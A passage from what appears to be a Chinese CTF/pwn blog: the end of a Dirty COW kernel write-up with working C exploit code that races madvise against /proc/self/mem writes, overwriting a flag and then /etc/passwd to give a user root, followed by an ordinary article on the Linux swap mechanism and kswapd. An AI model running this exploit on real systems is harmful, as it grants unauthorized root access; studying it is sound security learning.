class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>); <span class="comment">/* 把文件映射到map指向的内存区域 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmap %zx\n&quot;</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">    pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">/ $ ./dirtyc0w flag flag&#123;cooooow&#125;</span><br><span class="line">mmap b7784000</span><br><span class="line">madvise 0</span><br><span class="line">procselfmem 13000000</span><br><span class="line">success!!!</span><br><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;cooooow&#125;</span><br></pre></td></tr></table></figure>
<p>调试内核选用32位的 <code>linux-4.1.4</code>（quem 对64位 <code>linux-4.x</code> 的内核兼容性不是很好，尝试了好几个版本都失败了）</p>
<ul>
<li>断点到 <code>do_page_fault</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0xc1041600</span> &lt;do_page_fault&gt;            push   ebp</span><br><span class="line">  <span class="number">0xc1041601</span> &lt;do_page_fault+<span class="number">1</span>&gt;          mov    ebp, esp</span><br><span class="line">  <span class="number">0xc1041603</span> &lt;do_page_fault+<span class="number">3</span>&gt;          mov    ecx, cr2</span><br><span class="line">► <span class="number">0xc1041606</span> &lt;do_page_fault+<span class="number">6</span>&gt;          call   __do_page_fault                    &lt;__do_page_fault&gt;</span><br><span class="line">       arg[<span class="number">0</span>]: <span class="number">0xf4d33fa8</span> —▸ <span class="number">0xf54bff48</span> —▸ <span class="number">0xf54bff54</span> —▸ <span class="number">0xf54bff6c</span> —▸ <span class="number">0xf54bffac</span> ◂— ...</span><br><span class="line">       arg[<span class="number">1</span>]: <span class="number">0xc1825eca</span> (page_fault+<span class="number">98</span>) ◂— jmp    <span class="number">0xc1824f90</span></span><br><span class="line">       arg[<span class="number">2</span>]: <span class="number">0xbffffffd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>由于本人不会调试内核多线程，后面的操作就没法展示了</li>
</ul>
<p>2.修改 <code>/etc/passwd</code> 中用户的 uid 和组 id 来实现提权：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">    <span class="comment">/* 改写passwd文件实现提权 */</span></span><br><span class="line">    <span class="keyword">char</span> *content= <span class="string">&quot;charlie:x:0:0:,,,,,,,,,,,,,,,,,,:/root:/bin/bash&quot;</span>;</span><br><span class="line">    <span class="keyword">off_t</span> offset = (<span class="keyword">off_t</span>) arg;</span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">	    lseek(f, offset, SEEK_SET);</span><br><span class="line">	    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> file_size = (<span class="keyword">int</span>) arg;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    	madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">int</span> file_size;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    </span><br><span class="line">    fstat(f, &amp;st);</span><br><span class="line">    file_size = st.st_size;</span><br><span class="line">    <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;yhellow&quot;</span>); <span class="comment">/* 找到对应的用户名位置 */</span></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="keyword">void</span> *)file_size); </span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position); </span><br><span class="line">    </span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/16/Linux%20Swap%E6%9C%BA%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/16/Linux%20Swap%E6%9C%BA%E5%88%B6/" class="post-title-link" itemprop="url">Linux Swap机制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-16 22:49:11" itemprop="dateCreated datePublished" datetime="2022-11-16T22:49:11+08:00">2022-11-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-22 01:22:46" itemprop="dateModified" datetime="2022-11-22T01:22:46+08:00">2022-11-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Linux Swap机制</strong></p>
<p>在 Linux 下，当物理内存不足时，拿出部分硬盘空间当 Swap 分区（也被称为“虚拟内存”，从硬盘中划分出的一个分区），从而解决内存容量不足的情况</p>
<ul>
<li>Swap 意思是交换， 当物理内存不够用的时候，内核就会释放缓存区（buffers/cache）里一些长时间不用的程序，然后将这些程序临时放到 Swap 中 </li>
<li>Swap Out：当某进程向OS请求内存发现不足时，OS会把内存中暂时不用的数据交换出去，放在 SWAP 分区中</li>
<li>Swap In：当某进程又需要这些数据且OS发现还有空闲物理内存时，又会把 Swap 分区中的数据交换回物理内存中</li>
</ul>
<p>Linux 操作系统使用如下这几种机制来检查系统内存是否需要进行页面回收：</p>
<ul>
<li>周期回收：<ul>
<li>这是由后台运行的守护进程 kswapd 完成的</li>
<li>该进程定期检查当前系统的内存使用情况，当发现系统内空闲的物理页面数目少于特定的阈值时，该进程就会发起页面回收的操作</li>
</ul>
</li>
<li>内存紧缺回收：<ul>
<li>操作系统忽然需要通过伙伴系统为用户进程分配一大块内存，或者需要创建一个很大的缓冲区，而当时系统中的内存没有办法提供足够多的物理内存以满足这种内存请求</li>
<li>这时候，操作系统就必须尽快进行页面回收操作，以便释放出一些内存空间从而满足上述的内存请求</li>
<li>这种页面回收方式也被称作“直接页面回收”</li>
</ul>
</li>
<li>睡眠回收：<ul>
<li>在进程进入 <code>suspend-to-disk</code>（休眠）状态时，内核必须释放内存</li>
</ul>
</li>
</ul>
<p>如果 Linux 在进行了内存回收操作之后仍然无法回收到足够多的页面以满足上述内存要求，那么操作系统只有最后一个选择，那就是使用 OOM(out of memory) killer，它从系统中挑选一个最合适的进程杀死它，并释放该进程所占用的所有页面</p>
<p>Linux 内核的页面回收算法为 PFRA</p>
<ul>
<li>PFRA 采取从用户态进程和内核高速缓存“窃取”页框的办法补充伙伴系统的空闲块列表</li>
<li>PFRA 的目标之一就是保存最少的空闲页到磁盘，以便内核可以安全地从“内存紧缺”的情形中恢复过来</li>
</ul>
<p>PFRA 需要做的第一件事情就是明确：哪些页面可以被 Swap，哪些又不能</p>
<p>于是 PFRA 按照页框所含内容，以不同的方式处理页框：</p>
<ul>
<li>不可回收页：不允许也无需回收<ul>
<li>空闲页（包含在子伙伴系统表列中）</li>
<li>保留页（PG_reserved 标志置位）</li>
<li>内核动态分配页</li>
<li>进程内核态堆栈页</li>
<li>临时锁定页（PG_locked 标志置位）</li>
<li>内存锁定页（VM_LOCKED 标志置位，并且在先行区中）</li>
</ul>
</li>
<li>可回收页：可以将该页的内存保存在 Swap 交换区（作为 “虚拟内存” 的磁盘区域）<ul>
<li>用户态地址空间的匿名页</li>
<li>tmpfs 文件系统的映射页（例如：POSIX 接口中 IPC 共享内存的页）</li>
</ul>
</li>
<li>可同步页：必要时，与磁盘镜像同步这些页<ul>
<li>用户态地址空间的映射页</li>
<li>存有磁盘文件数据，并且在页高速缓存中的页</li>
<li>块设备缓冲区页</li>
<li>某些磁盘的高速缓存页（例如：索引节点高速缓存）</li>
</ul>
</li>
<li>可丢弃页：无需操作<ul>
<li>内存高速缓存中的未使用页（例如：Slab 分配器高速缓存）</li>
<li>目录中高速缓存的未使用页</li>
</ul>
</li>
</ul>
<p><strong>Swap 基础结构</strong></p>
<p>每一个活动的交换区都会由一个 <code>swap_info_struct</code> 结构体进行描述：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">swap_info_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	flags;		<span class="comment">/* SWP_USED etc: see above */</span></span><br><span class="line">	<span class="keyword">signed</span> <span class="keyword">short</span>	prio;		<span class="comment">/* swap priority of this type */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span> <span class="title">list</span>;</span>		<span class="comment">/* entry in swap_active_head */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span> <span class="title">avail_lists</span>[<span class="title">MAX_NUMNODES</span>];</span><span class="comment">/* entry in swap_avail_heads */</span></span><br><span class="line">	<span class="keyword">signed</span> <span class="keyword">char</span>	type;		<span class="comment">/* strange name for an index */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>	max;		<span class="comment">/* extent of the swap_map */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *swap_map;	<span class="comment">/* 一个非常大的数组,其中的每项都对应了一个交换区的一个槽(交换项)的引用计数 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_cluster_info</span> *<span class="title">cluster_info</span>;</span> <span class="comment">/* cluster info. Only for SSD */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_cluster_list</span> <span class="title">free_clusters</span>;</span> <span class="comment">/* free clusters list */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> lowest_bit;	<span class="comment">/* index of first free in swap_map */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> highest_bit;	<span class="comment">/* index of last free in swap_map */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> pages;		<span class="comment">/* total of usable pages of swap */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse_pages;	<span class="comment">/* number of those currently in use */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cluster_next;	<span class="comment">/* 交换文件当前的偏移量 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cluster_nr;	<span class="comment">/* 交换区中已经分配的页面数 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">percpu_cluster</span> __<span class="title">percpu</span> *<span class="title">percpu_cluster</span>;</span> <span class="comment">/* per cpu&#x27;s swap location */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_extent</span> *<span class="title">curr_swap_extent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_extent</span> <span class="title">first_swap_extent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">bdev</span>;</span>	<span class="comment">/* swap device or bdev of swap file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">swap_file</span>;</span>		<span class="comment">/* seldom referenced */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> old_block_size;	<span class="comment">/* seldom referenced */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FRONTSWAP</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *frontswap_map;	<span class="comment">/* frontswap in-use, one bit per page */</span></span><br><span class="line">	<span class="keyword">atomic_t</span> frontswap_pages;	<span class="comment">/* frontswap pages in-use counter */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">spinlock_t</span> lock;		<span class="comment">/*</span></span><br><span class="line"><span class="comment">					 * protect map scan related fields like</span></span><br><span class="line"><span class="comment">					 * swap_map, lowest_bit, highest_bit,</span></span><br><span class="line"><span class="comment">					 * inuse_pages, cluster_next,</span></span><br><span class="line"><span class="comment">					 * cluster_nr, lowest_alloc,</span></span><br><span class="line"><span class="comment">					 * highest_alloc, free/discard cluster</span></span><br><span class="line"><span class="comment">					 * list. other fields are only changed</span></span><br><span class="line"><span class="comment">					 * at swapon/swapoff, so are protected</span></span><br><span class="line"><span class="comment">					 * by swap_lock. changing flags need</span></span><br><span class="line"><span class="comment">					 * hold this lock and swap_lock. If</span></span><br><span class="line"><span class="comment">					 * both locks need hold, hold swap_lock</span></span><br><span class="line"><span class="comment">					 * first.</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span> cont_lock;		<span class="comment">/*</span></span><br><span class="line"><span class="comment">					 * protect swap count continuation page</span></span><br><span class="line"><span class="comment">					 * list.</span></span><br><span class="line"><span class="comment">					 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">discard_work</span>;</span> <span class="comment">/* discard worker */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">swap_cluster_list</span> <span class="title">discard_clusters</span>;</span> <span class="comment">/* discard clusters list */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>系统会把这些 <code>swap_info_struct</code> 存放在一个 <code>swap_info</code> 数组中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">swap_info_struct</span> *<span class="title">swap_info</span>[<span class="title">MAX_SWAPFILES</span>];</span></span><br></pre></td></tr></table></figure>
<p>每个交换区在磁盘上都划分出大量一页大小的槽，第一个槽存放有交换区的基本信息，在内核中由一个 <code>swap_header</code> 联合体进行表示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">swap_header</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">char</span> reserved[PAGE_SIZE - <span class="number">10</span>];</span><br><span class="line">		<span class="keyword">char</span> magic[<span class="number">10</span>];			<span class="comment">/* SWAP-SPACE or SWAPSPACE2 */</span></span><br><span class="line">	&#125; magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="keyword">char</span>		bootbits[<span class="number">1024</span>];	<span class="comment">/* Space for disklabel etc. */</span></span><br><span class="line">		__u32		version;</span><br><span class="line">		__u32		last_page;</span><br><span class="line">		__u32		nr_badpages;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span>	sws_uuid[<span class="number">16</span>];</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">char</span>	sws_volume[<span class="number">16</span>];</span><br><span class="line">		__u32		padding[<span class="number">117</span>];</span><br><span class="line">		__u32		badpages[<span class="number">1</span>];</span><br><span class="line">	&#125; info;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Linux 将磁盘中的 SWAPFILE_CLUSTER 个页分配到一个簇中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_THP_SWAP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPFILE_CLUSTER	HPAGE_PMD_NR</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swap_entry_size(size)	(size)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPFILE_CLUSTER	256</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>swap_info_struct-&gt;cluster_nr</code> 中记录“交换区中已经分配的页面数”</li>
<li>在 <code>swap_info_struct-&gt;cluster_next</code> 中记录“交换文件当前的偏移量”</li>
</ul>
<p><strong>映射页表项到交换区</strong></p>
<p>当一个页面被交换出时，Linux 使用相应的页表项 PTE 来存放用于再次从磁盘上定位该页的信息：</p>
<ul>
<li>PTE 本身不能直接精准保存交换页面的位置信息</li>
<li>PTE 只需要存放交换槽在 <code>swap_info</code> 数组的下标，以及在 <code>swap_map</code> 中的偏移量</li>
</ul>
<p>通过如下两个函数进行转换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">swp_entry_t</span> <span class="title">pte_to_swp_entry</span><span class="params">(<span class="keyword">pte_t</span> pte)</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">pte_t</span> <span class="title">swp_entry_to_pte</span><span class="params">(<span class="keyword">swp_entry_t</span> entry)</span></span></span><br></pre></td></tr></table></figure>
<p><strong>交换区高速缓存 Swap Tcache</strong></p>
<p>Linux 无法快速完成从 PTE 引用到页面结构的转化，因此，多线程共享页面不能简单地取出</p>
<p>为了解决这个问题，共享页会在内存中保留一个槽，作为高速缓存的一部分</p>
<p><strong>Linux 回收平衡</strong></p>
<p>Linux 页面回收，并不是回收得越多越好，而是力求达到一种平衡（内存 Swap 是需要代价的）</p>
<p>物理内存在 Kernel 中主要有这么几个层次的划分：</p>
<ul>
<li>全体内存</li>
<li>一个 NUMA 节点的内存</li>
<li>一个 NUMA 节点中的一个 zone 的内存 </li>
</ul>
<p>维护空闲页面的伙伴系统和维护可回收页面的 LRU 都工作在 zone 这一层，所以具体的内存回收操作也是在 zone 层进行的</p>
<p>Kernel 中追求的平衡并不针对全体内存，而是针对每一个 NUMA 节点的内存而言的：</p>
<ul>
<li>NUMA 系统中的每一个节点都是并列的，统一考虑整体的平衡其实没什么意义</li>
<li>所以对应于系统中的每个 NUMA 节点都会有一个 kswapd 线程来进行平衡</li>
</ul>
<p>单个 NUMA 节点的内存的平衡由 <code>pgdat_balanced</code> 函数来判断</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">pgdat_balanced</span><span class="params">(<span class="keyword">pg_data_t</span> *pgdat, <span class="keyword">int</span> order, <span class="keyword">int</span> classzone_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> mark = <span class="number">-1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= classzone_idx; i++) &#123;</span><br><span class="line">		zone = pgdat-&gt;node_zones + i;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!managed_zone(zone))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		mark = high_wmark_pages(zone);</span><br><span class="line">		<span class="keyword">if</span> (zone_watermark_ok_safe(zone, order, mark, classzone_idx))</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mark == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>pgdat_balanced</code> 需要两个重要的指标：<ul>
<li><code>classzone_idx</code>：用于确定一种类型的 zone</li>
<li><code>order</code>：用于确定一对伙伴页的大小</li>
</ul>
</li>
</ul>
<p><code>classzone_idx</code>：</p>
<p>在 Kernel 中，一个 NUMA 节点的内存被分成若干个 zone（区分依据为簇到处理器的“距离”），一个 zone 用于表示内存中的某个范围，在 Linux 中由下标 <code>classzone_idx</code> 来进行索引：</p>
<ul>
<li>这些 zone 下标越大，zone 里的内存使用范围就越小</li>
<li>小下标 zone 的内存用途总是包含大下标 zone 的</li>
<li>因此大下标的 zone 显得更加“不通用”</li>
</ul>
<p>于是在进行内存分配的时候，总是会优先尝试在 <code>classzone_idx</code> 最大的 zone 里面的去分配，不行再尝试 <code>classzone_idx</code> 更小的 zone</p>
<p><code>order</code>：</p>
<p>zone 里面的内存是用伙伴系统来管理的，伙伴系统里面有很多个 <code>freelist</code>，分别是 2^n 个连续页面的空闲链表</p>
<ul>
<li><code>order</code> 就代表这里的 n，<code>order</code> 越大，意味着需要越多的连续页面</li>
<li>大 <code>order</code> 对小 <code>order</code> 也是有包含关系的</li>
<li>大 <code>order</code> 的连续内存其实并不是那么容易就回收到的</li>
</ul>
<p>于是伙伴系统会尽量避免分裂大 <code>order</code> 的连续内存，碎片化的小 <code>order</code> 内存会成为优先分配的目标</p>
<p><strong>kswapd 线程</strong></p>
<p>kswapd 是 Linux 中用于页面回收的内核线程，拥有如下特性：</p>
<ul>
<li>kswapd 线程每100毫秒起来工作一次，或者由于别的进程分配内存失败，而被唤醒</li>
<li>kswapd 每次工作都有一个 <code>order</code> 和 <code>classzone_idx</code> 作为目标</li>
<li>kswapd 如果主动工作，<code>order</code> 总是“0”，<code>classzone_idx</code> 总是最大的 zone </li>
</ul>
<p>其实 kswapd 的任务就是让每一个 zone 的空闲内存都超过高水位，至于页面在各个 order 间的平衡分布就不用管</p>
<p>对于 kswapd 拿到的 <code>order</code>，所以如果达不到平衡分布，就还得继续回收以及尝试小 <code>order</code> 向大 <code>order</code> 的组装</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/prike/article/details/78905753">linux kswapd浅析</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/15/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AFCTF2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
